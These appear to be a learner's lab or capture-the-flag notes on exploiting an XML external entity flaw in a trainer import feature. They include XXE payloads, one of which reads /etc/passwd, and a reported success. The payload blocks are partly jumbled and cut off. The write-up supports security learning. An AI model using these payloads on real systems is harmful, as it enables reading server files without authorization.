after logged in as `bugs:bugs` identified potential `XXE` vulnerability due to the `import:export` functions at `http://mentor/admin/trainer/1`

![[Pasted image 20241122220936.png]]
the first step in `exploiting` `XXE` is to export to identify what fields are being utilized in the `xml`

upon `hitting export` we get an export download
![[Pasted image 20241122221951.png]]
now we have some paths that we can potentially use to exploit

now we need to identify which field is vulnerable to `XXE` by utilizing the `&xxe;` payload
#### test1
test 1:
```xml
<?xml version="1.0"?>
<!DOCTYPE data [
<!ELEMENT data ANY >
<!ENTITY xxe "Vulnerable to XXE">
]>
<response>
  <id>&xxe;</id>
  <name>Robin Marjan</name>
  <proffesion>Web Development</proffesion>
  <bio>Robin is a web developer, mentor, and professor who is prominent in his field. He has been working in the industry for over 20 years and has seen it all.

  <imgPath>/assets/img/trainers/1.jpg</imgPath>

```
upon submission in burp shows a server error - nothing happens

#### test2

```xml
<?xml version="1.0"?>
<!DOCTYPE data [
<!ELEMENT data ANY >
<!ENTITY xxe "Vulnerable to XXE">
]>
<response>
  <id>1</id>
  <name>&xxe;</name>

  <imgPath>/assets/img/trainers/1.jpg</imgPath>
</response>
```
upon `importing` test2.xml the name was changed to `Vulnerable to XXE` means this is the field 
![[Pasted image 20241122223759.png]]
now going to try to get `/etc/passwd`
```xml
<?xml version="1.0"?>
<!DOCTYPE data [
<!ELEMENT data ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<response>
  <id>1</id>
  <name>&xxe;</name>

server error when trying that  - there might be a limit to characters in the `name` field

#### test3

  <bio>&xxe;</bio>

</response>
```
upon importing all fields may be vulnerable to `&xxe;` 
![[Pasted image 20241122224458.png]]
- going to just try the bio for the `/etc/passwd` payload
`test3continued.xml`
```xml
<?xml version="1.0"?>
<!DOCTYPE data [

worked, got `/etc/passwd`
